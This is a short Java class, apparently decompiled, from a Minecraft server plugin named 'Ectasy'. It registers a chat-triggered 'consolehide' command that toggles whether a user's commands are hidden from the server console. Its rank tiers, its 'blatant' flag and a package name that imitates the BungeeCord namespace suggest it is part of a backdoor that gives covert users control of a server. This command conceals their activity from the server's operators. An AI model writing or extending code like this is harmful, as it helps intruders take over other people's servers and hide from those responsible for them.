package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "consolehide",
   description = "Hides commands from console",
   blatant = false,
   rank = Rank.LITE
)
public class ConsoleHideCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      User var4 = Ectasy.users.get(var1.getPlayer().getName());
      var4.hidingConsole = !var4.hidingConsole;
      ChatUtil.sendChat(var4.player, "Console hide has been " + (var4.hidingConsole ? "&aenabled" : "&cdisabled"));
   }
}
